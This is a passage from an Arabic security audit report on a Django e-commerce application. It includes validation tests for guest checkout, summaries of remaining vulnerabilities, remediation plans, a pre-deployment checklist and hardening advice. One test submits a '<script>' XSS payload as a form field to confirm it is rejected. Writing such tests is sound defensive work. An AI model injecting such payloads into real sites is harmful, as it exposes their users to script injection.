            
            messages.success(request, f"تم إنشاء الطلب بنجاح. رقم الطلب: #{order.id}")
            return redirect('orders:order_success', order_id=order.id)
            
        except Exception as e:
            import logging
            logger = logging.getLogger(__name__)
            logger.exception("Guest checkout error")
            messages.error(request, "حدث خطأ أثناء إنشاء الطلب")
            return redirect('orders:checkout')
```

**اختبارات التحقق:**
```python
# tests.py
from django.test import TestCase, Client
from django.urls import reverse

class GuestCheckoutValidationTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.checkout_url = reverse('orders:checkout')

    def test_full_name_cannot_contain_script_tags(self):
        """تأكد من رفض الأسماء التي تحتوي على tags"""
        response = self.client.post(self.checkout_url, {
            'full_name': '<script>alert("XSS")</script>',
            'phone': '0100000000',
            'email': 'test@example.com',
            'address': 'Cairo',
            'city': 'Cairo'
        })
        
        # يجب أن يُرفع Validation Error
        self.assertEqual(response.status_code, 302)  # redirect
        
        # تحقق من عدم إنشاء الطلب
        self.assertEqual(Order.objects.count(), 0)

    def test_phone_normalization(self):
        """تأكد من تطبيع أرقام الهاتف"""
        response = self.client.post(self.checkout_url, {
            'full_name': 'Ahmed',
            'phone': '01234567890',  # صيغة مصرية
            'email': 'test@example.com',
            'address': 'Cairo',
            'city': 'Cairo'
        })
        
        # يجب أن ينجح وينضم الرقم
        order = Order.objects.first()
        self.assertIsNotNone(order)
        self.assertTrue(order.shipping_phone.startswith('+20'))

    def test_invalid_email_rejected(self):
        """تأكد من رفض رسائل البريد غير الصالحة"""
        response = self.client.post(self.checkout_url, {
            'full_name': 'Ahmed',
            'phone': '0100000000',
            'email': 'not-an-email',  # email غير صالح
            'address': 'Cairo',
            'city': 'Cairo'
        })
        
        # يجب أن يفشل الـ Validation
        self.assertEqual(Order.objects.count(), 0)
```

**المراجع المعيارية:**
- OWASP A03:2021 – Injection
- OWASP A06:2021 – Vulnerable and Outdated Components
- CWE-89: SQL Injection
- CWE-79: Improper Neutralization of Input During Web Page Generation
- OWASP ASVS 5.1.1: Verify that the application validates input from all untrusted data sources

---

## 📊 الثغرات المتبقية (موجزة)

نظرًا لحد الطول، إليك ملخص الثغرات المتبقية:

### 6️⃣ **Information Disclosure** (High)
- رسائل خطأ تكشف معلومات النظام
- قائمة عرض المنتجات قد تفشي بيانات
- نوع خادم الويب في Headers

### 7️⃣ **CORS Misconfiguration** (Medium)
- `ALLOWED_HOSTS = '*'` في Development (خطر)
- قد تكون هناك مشاكل CORS مع API Endpoints

### 8️⃣ **Missing Security Headers** (Medium)
- عدم وجود `Content-Security-Policy`
- عدم وجود `X-Content-Type-Options`
- `X-Frame-Options` موجود لكن قد تحتاج لـ `Strict-Transport-Security`

### 9️⃣ **File Upload Vulnerabilities** (High)
- صور المستخدمين (Avatar) بدون فحص MIME Type
- بدون قيود على حجم الملفات
- قد يسمح برفع ملفات executable

### 🔟 **Logging & Monitoring Gaps** (Medium)
- نقص في سجلات الأمان
- لا تنبيهات عند محاولات الدخول الفاشلة
- عدم تسجيل العمليات الحساسة (تغيير كلمات المرور، إلخ)

### 1️⃣1️⃣ **SQL Injection Risk (Search & Filters)** (Medium)
- دالة `search_products` قد تكون عرضة
- استخدام `icontains` آمن لكن يجب التحقق

### 1️⃣2️⃣ **Weak Database Encryption** (Medium)
- بيانات المستخدمين بدون تشفير إضافي
- كلمات المرور محمية لكن بيانات أخرى بدون حماية

---

## ✅ خطة الإصلاح السريعة (24 ساعة)

| الأولوية | الثغرة | الإجراء | المدة |
|---------|-------|--------|------|
| 🔴 1 | Hardcoded Credentials | نقل البيانات إلى `.env` | 1 ساعة |
| 🔴 2 | Weak Password Reset | تطبيق Token-based Reset | 3 ساعات |
| 🔴 3 | IDOR - Cart/Orders | إضافة تحقق الملكية | 2 ساعات |
| 🔴 4 | Rate Limiting | تثبيت `django-axes` | 1 ساعة |
| 🟠 5 | Input Validation | إضافة Forms Validation | 2 ساعات |

**المجموع: 9 ساعات** ✅

---

## 📋 خطة الإصلاح المتوسطة (أسبوع)

**الأسبوع الأول:**
- إصلاح جميع ثغرات Critical/High
- تطبيق HTTPS على جميع المسارات
- تفعيل Security Headers
- إضافة File Upload Validation
- تحسين Logging & Monitoring

---

## 🛡️ خطة التحسين طويلة المدى

1. **API Security**
   - إضافة API Authentication (JWT أو OAuth2)
   - Rate Limiting على API endpoints
   - CORS مشددة

2. **Data Protection**
   - تشفير البيانات الحساسة في قاعدة البيانات
   - استخدام `django-cryptography`

3. **Compliance**
   - GDPR Compliance للبيانات الشخصية
   - تطبيق سياسة خصوصية قوية
   - نظام Audit Logging

4. **Infrastructure**
   - Web Application Firewall (WAF)
   - DDoS Protection
   - Intrusion Detection System (IDS)

---

## ✔️ CheckList قبل النشر

### 🔐 Security Checks
- [ ] جميع البيانات الحساسة في `.env`
- [ ] DEBUG = False في Production
- [ ] ALLOWED_HOSTS محددة بدقة
- [ ] HTTPS مفعل وتصريح SSL صحيح
- [ ] CSRF Protection فعال
- [ ] Rate Limiting معروض
- [ ] Security Headers مضافة
- [ ] CORS مشددة

### 📊 Database & Data
- [ ] Backups منتظمة مفعلة
- [ ] Encryption للبيانات الحساسة
- [ ] لا توجد بيانات حقيقية في Development
- [ ] Access Control محدد

### 🔍 Code Review
- [ ] لا توجد Hard-coded Credentials
- [ ] Input Validation على جميع Forms
- [ ] Output Encoding في Templates
- [ ] التحقق من IDOR في جميع Resources

### 📝 Logging & Monitoring
- [ ] Security Logging فعال
- [ ] Alerting على Failed Logins
- [ ] Monitoring على API Traffic
- [ ] Error Tracking (مثل Sentry)

### 🧪 Testing
- [ ] OWASP Top 10 Security Tests
- [ ] Penetration Testing
- [ ] Security Code Review
- [ ] Dependencies Scan

---

## 🚀 توصيات حماية الإنتاج

### 1. **Infrastructure Security**
```bash
# استخدام Nginx مع تكوين أمني قوي
proxy_set_header X-Forwarded-For $remote_addr;
add_header X-Frame-Options "DENY";
add_header X-Content-Type-Options "nosniff";
add_header X-XSS-Protection "1; mode=block";
add_header Referrer-Policy "strict-origin-when-cross-origin";
```

### 2. **WAF Configuration**
```bash
# ModSecurity يمكنه حماية من:
# - SQL Injection
# - XSS
# - File Upload attacks
# - Protocol attacks
```

### 3. **Monitoring & Alerting**
```python
# استخدام Sentry للـ Error Tracking
SENTRY_DSN = config('SENTRY_DSN')

# استخدام Datadog أو New Relic للـ Monitoring
# - Failed Login Attempts
# - Slow Queries
# - High Error Rates
```

### 4. **Backup Strategy**
```bash
# يومي: Full Backup من Database و Media
# أسبوعي: Archive للتخزين البعيد
# شهري: Recovery Test
```

---

## 📞 نقاط الاتصال للمساعدة

عند الاستفسار عن أي ثغرة:
1. اقرأ القسم المتعلق بالثغرة
2. تحقق من الكود المقترح للإصلاح
3. طبق الاختبارات المرفقة
4. راقب الـ Security Headers بعد الإصلاح

---

**تم التوقيع:**  
**Security Auditor**  
28 أبريل 2026
